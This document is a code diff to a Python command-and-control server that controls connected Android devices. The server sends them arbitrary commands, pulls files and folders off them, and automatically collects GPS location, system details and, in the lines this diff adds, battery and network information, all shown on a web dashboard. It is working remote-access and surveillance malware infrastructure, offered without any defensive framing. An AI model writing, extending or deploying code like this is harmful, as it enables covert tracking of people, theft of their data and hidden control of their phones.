@@ -208,7 +208,10 @@ class C2ServerThread(threading.Thread):
                         'addr': addr,
                         'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                         'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                        'sys_info': ''
+                        'sys_info': '',
+                        'battery': '',
+                        'network_info': '',
+                        'lock': threading.Lock()
                     }
 
                     print(f"[*] Connection received from {addr[0]}:{addr[1]}")
@@ -217,7 +220,9 @@ class C2ServerThread(threading.Thread):
                         'ip': addr[0],
                         'port': addr[1],
                         'connected_at': clients[client_id]['connected_at'],
-                        'sys_info': ''
+                        'sys_info': '',
+                        'battery': '',
+                        'network_info': ''
                     }, namespace='/')
 
                     # Auto-query sys_info to identify the client
@@ -225,6 +230,9 @@ class C2ServerThread(threading.Thread):
                     
                     # Auto-query location to immediately get GPS coordinates
                     threading.Thread(target=query_client_location, args=(client_id,), daemon=True).start()
+                    
+                    # Auto-query battery and network info
+                    threading.Thread(target=query_client_battery_and_network, args=(client_id,), daemon=True).start()
                     
                 except socket.timeout:
                     continue
@@ -319,129 +327,135 @@ def send_command_to_client(client_id, command, save_path=None):
     if client_id not in clients:
         return {'success': False, 'error': 'Client not found'}
 
-    # Mark the client as busy
-    clients[client_id]['is_transferring'] = True
-    client_socket = clients[client_id]['socket']
+    client_lock = clients[client_id].get('lock')
+    if client_lock is None:
+        return {'success': False, 'error': 'Client lock not found'}
 
-    try:
-        # Send command with newline
-        client_socket.send((command + "\n").encode())
-
-        if command == "exit":
-            client_socket.close()
-            remove_client_bindings(client_id)
-            del clients[client_id]
-            socketio.emit('client_disconnected', {'client_id': client_id}, namespace='/')
-            return {'success': True, 'response': 'Client disconnected'}
-
-        # Get response header
-        header_bytes = client_socket.recv(1024)
+    with client_lock:
+        # Mark the client as busy
+        clients[client_id]['is_transferring'] = True
+        client_socket = clients[client_id]['socket']
 
         try:
-            header = header_bytes.decode().strip()
-        except UnicodeDecodeError:
-            if header_bytes.startswith(b"SIZE"):
-                header = header_bytes[:header_bytes.find(b'\n')].decode().strip() if b'\n' in header_bytes else header_bytes.decode('utf-8', errors='ignore').strip()
-            else:
-                return {'success': False, 'error': 'Received binary data without proper header'}
+            # Send command with newline
+            client_socket.send((command + "\n").encode())
 
-        # Check if it's a file transfer
-        if header.startswith("SIZE"):
+            if command == "exit":
+                client_socket.close()
+                remove_client_bindings(client_id)
+                del clients[client_id]
+                socketio.emit('client_disconnected', {'client_id': client_id}, namespace='/')
+                return {'success': True, 'response': 'Client disconnected'}
+
+            # Get response header
+            header_bytes = client_socket.recv(1024)
+
             try:
-                file_size = int(header.split()[1])
-                filename = command.split()[-1].split('/')[-1] if len(command.split()) > 1 else "downloaded_file.dat"
-
-                # Determine where to save the file
-                if save_path is not None:
-                    filepath = save_path
-                    os.makedirs(os.path.dirname(filepath), exist_ok=True)
+                header = header_bytes.decode().strip()
+            except UnicodeDecodeError:
+                if header_bytes.startswith(b"SIZE"):
+                    header = header_bytes[:header_bytes.find(b'\n')].decode().strip() if b'\n' in header_bytes else header_bytes.decode('utf-8', errors='ignore').strip()
                 else:
-                    downloads_dir = os.path.join(os.path.dirname(__file__), 'downloads')
-                    sys_info = clients.get(client_id, {}).get('sys_info', '') or 'unknown_device'
-                    device_dir = os.path.join(downloads_dir, sys_info)
-                    os.makedirs(device_dir, exist_ok=True)
-                    filepath = os.path.join(device_dir, filename)
+                    return {'success': False, 'error': 'Received binary data without proper header'}
 
-                with open(filepath, "wb") as f:
-                    bytes_received = 0
-                    leftover = b""
+            # Check if it's a file transfer
+            if header.startswith("SIZE"):
+                try:
+                    file_size = int(header.split()[1])
+                    filename = command.split()[-1].split('/')[-1] if len(command.split()) > 1 else "downloaded_file.dat"
 
-                    if b'\n' in header_bytes:
-                        file_start_pos = header_bytes.find(b'\n') + 1
-                        after_header = header_bytes[file_start_pos:]
-                        # Cap to file_size — small files may arrive with "File sent successfully\n"
-                        # bundled in the same recv, which must NOT be written into the file
-                        initial_data = after_header[:file_size]
-                        leftover = after_header[file_size:]
-                        if initial_data:
-                            f.write(initial_data)
-                            bytes_received += len(initial_data)
+                    # Determine where to save the file
+                    if save_path is not None:
+                        filepath = save_path
+                        os.makedirs(os.path.dirname(filepath), exist_ok=True)
+                    else:
+                        downloads_dir = os.path.join(os.path.dirname(__file__), 'downloads')
+                        sys_info = clients.get(client_id, {}).get('sys_info', '') or 'unknown_device'
+                        device_dir = os.path.join(downloads_dir, sys_info)
+                        os.makedirs(device_dir, exist_ok=True)
+                        filepath = os.path.join(device_dir, filename)
 
-                    while bytes_received < file_size:
-                        chunk = client_socket.recv(min(65536, file_size - bytes_received))
+                    with open(filepath, "wb") as f:
+                        bytes_received = 0
+                        leftover = b""
+
+                        if b'\n' in header_bytes:
+                            file_start_pos = header_bytes.find(b'\n') + 1
+                            after_header = header_bytes[file_start_pos:]
+                            # Cap to file_size — small files may arrive with "File sent successfully\n"
+                            # bundled in the same recv, which must NOT be written into the file
+                            initial_data = after_header[:file_size]
+                            leftover = after_header[file_size:]
+                            if initial_data:
+                                f.write(initial_data)
+                                bytes_received += len(initial_data)
+
+                        while bytes_received < file_size:
+                            chunk = client_socket.recv(min(65536, file_size - bytes_received))
+                            if not chunk:
+                                break
+                            f.write(chunk)
+                            bytes_received += len(chunk)
+                            # CRITICAL for eventlet: yield control to keep the web server alive
+                            eventlet.sleep(0)
+
+                    # Get final status — may already be in leftover for small files
+                    try:
+                        if leftover:
+                            final_status = leftover.decode('utf-8', errors='replace').strip()
+                        else:
+                            final_status = client_socket.recv(1024).decode()
+                    except:
+                        final_status = ""
+
+                    clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    return {
+                        'success': True,
+                        'response': f"File downloaded: {filename} ({file_size} bytes)\nSaved to: {filepath}\n{final_status}",
+                        'file_download': True,
+                        'filename': filename,
+                        'filepath': filepath
+                    }
+
+                except Exception as e:
+                    return {'success': False, 'error': f'Error during download: {str(e)}'}
+            else:
+                # Normal text response
+                response = header.encode()
+                client_socket.settimeout(0.5)
+                try:
+                    while True:
+                        chunk = client_socket.recv(10240)
                         if not chunk:
                             break
-                        f.write(chunk)
-                        bytes_received += len(chunk)
-                        # CRITICAL for eventlet: yield control to keep the web server alive
-                        eventlet.sleep(0)
+                        response += chunk
+                except socket.timeout:
+                    pass
+                client_socket.settimeout(None)
 
-                # Get final status — may already be in leftover for small files
                 try:
-                    if leftover:
-                        final_status = leftover.decode('utf-8', errors='replace').strip()
-                    else:
-                        final_status = client_socket.recv(1024).decode()
+                    response_text = response.decode()
+                    clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    return {'success': True, 'response': response_text}
+                except UnicodeDecodeError:
+                    return {'success': True, 'response': f'<binary data, {len(response)} bytes>'}
+                    
+        except Exception as e:
+            # Client probably disconnected
+            if client_id in clients:
+                try:
+                    clients[client_id]['socket'].close()
                 except:
-                    final_status = ""
-
-                clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                return {
-                    'success': True,
-                    'response': f"File downloaded: {filename} ({file_size} bytes)\nSaved to: {filepath}\n{final_status}",
-                    'file_download': True,
-                    'filename': filename,
-                    'filepath': filepath
-                }
-
-            except Exception as e:
-                return {'success': False, 'error': f'Error during download: {str(e)}'}
-        else:
-            # Normal text response
-            response = header.encode()
-            client_socket.settimeout(0.5)
-            try:
-                while True:
-                    chunk = client_socket.recv(10240)
-                    if not chunk:
-                        break
-                    response += chunk
-            except socket.timeout:
-                pass
-            client_socket.settimeout(None)
-
-            try:
-                response_text = response.decode()
-                clients[client_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                return {'success': True, 'response': response_text}
-            except UnicodeDecodeError:
-                return {'success': True, 'response': f'<binary data, {len(response)} bytes>'}
-            finally:
-                # Allow heartbeats to resume once transfer is done
-                if client_id in clients:
-                    clients[client_id]['is_transferring'] = False
-
-    except Exception as e:
-        # Client probably disconnected
-        if client_id in clients:
-            try:
-                clients[client_id]['socket'].close()
-            except:
-                pass
-            remove_client_bindings(client_id)
-            del clients[client_id]
-            socketio.emit('client_disconnected', {'client_id': client_id}, namespace='/')
-        return {'success': False, 'error': f'Client error: {str(e)}'}
+                    pass
+                remove_client_bindings(client_id)
+                del clients[client_id]
+                socketio.emit('client_disconnected', {'client_id': client_id}, namespace='/')
+            return {'success': False, 'error': f'Client error: {str(e)}'}
+            
+        finally:
+            # Allow heartbeats to resume once transfer is done
+            if client_id in clients:
+                clients[client_id]['is_transferring'] = False
 
 def download_folder(client_id, folder_path, local_base_path=None):
     """Recursively download all files in a folder from a client, one file at a time"""
@@ -538,7 +552,9 @@ def query_client_sysinfo(client_id):
         print(f"[*] sys_info for {client_id}: {sys_info_output[:80]}")
         socketio.emit('client_info_updated', {
             'client_id': client_id,
-            'sys_info': sys_info_output
+            'sys_info': sys_info_output,
+            'battery': clients[client_id].get('battery', ''),
+            'network_info': clients[client_id].get('network_info', '')
         }, namespace='/')
     elif client_id in clients:
         clients[client_id]['sys_info'] = ''
@@ -570,6 +586,33 @@ def query_client_location(client_id):
             print(f"[!] Could not parse location for {client_id}")
     else:
         print(f"[!] Failed to get location for {client_id}: {result.get('error', 'unknown error')}")
+
+def query_client_battery_and_network(client_id):
+    """Send battery and network_info commands to a newly connected client and store the results"""
+    time.sleep(1.0)  # Wait a bit
+    
+    # Query battery
+    result_batt = send_command_to_client(client_id, 'battery')
+    if result_batt.get('success') and client_id in clients:
+        batt_output = result_batt['response'].strip()
+        clients[client_id]['battery'] = batt_output
+        print(f"[*] Battery for {client_id}: {batt_output[:80]}")
+    
+    # Query network
+    time.sleep(0.5)
+    result_net = send_command_to_client(client_id, 'network_info')
+    if result_net.get('success') and client_id in clients:
+        net_output = result_net['response'].strip()
+        clients[client_id]['network_info'] = net_output
+        print(f"[*] Network for {client_id}: {net_output[:80]}")
+    
+    if client_id in clients:
+        # Emit update
+        socketio.emit('client_status_updated', {
+            'client_id': client_id,
+            'battery': clients[client_id].get('battery', ''),
+            'network_info': clients[client_id].get('network_info', '')
+        }, namespace='/')
 
 def parse_location_response(location_text):
     """Parse the location response from Android client"""
@@ -617,7 +660,9 @@ def get_clients():
             'port': client_info['addr'][1],
             'connected_at': client_info['connected_at'],
             'last_seen': client_info['last_seen'],
-            'sys_info': client_info.get('sys_info', '')
+            'sys_info': client_info.get('sys_info', ''),
+            'battery': client_info.get('battery', ''),
+            'network_info': client_info.get('network_info', '')
         }
         # Add location data if available
         if client_id in client_locations:
@@ -770,7 +815,9 @@ def handle_connect():
             'ip': client_info['addr'][0],
             'port': client_info['addr'][1],
             'connected_at': client_info['connected_at'],
-            'sys_info': client_info.get('sys_info', '')
+            'sys_info': client_info.get('sys_info', ''),
+            'battery': client_info.get('battery', ''),
+            'network_info': client_info.get('network_info', '')
         })
 
 @socketio.on('refresh_location')
